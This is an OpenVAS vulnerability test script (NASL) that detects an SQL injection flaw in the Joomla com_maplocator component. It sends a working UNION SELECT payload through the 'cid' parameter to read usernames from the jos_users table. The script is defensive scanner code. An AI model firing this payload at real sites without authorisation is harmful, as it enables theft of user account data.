##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_maplocator_sql_inj_vuln.nasl 10471 2018-07-09 15:14:32Z ckuersteiner $
#
# Joomla Component 'com_maplocator' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902375");
  script_version("$Revision: 10471 $");
  script_tag(name:"last_modification", value:"$Date: 2018-07-09 17:14:32 +0200 (Mon, 09 Jul 2018) $");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Joomla Component 'com_maplocator' SQL Injection Vulnerability");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/install
ed");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to conduct SQL Injection attacks
and gain sensitive information.");

  script_tag(name:"affected", value:"Joomla com_maplocator component");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
'cid' parameter in 'index.php', which allows attacker to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Joomla with com_maplocator component and is prone to
SQL injection vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101608/joomlamaplocator-sql.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/index.php?option=com_maplocator&view=state&cid=null+AND+1=0+union+select+1,2,concat(username,0x3a,' +
            '0x4f70656e564153)fl0rix,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+jos_users--';

if (http_vuln_check(port: port, url: url, pattern: '>admin:OpenVAS')) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
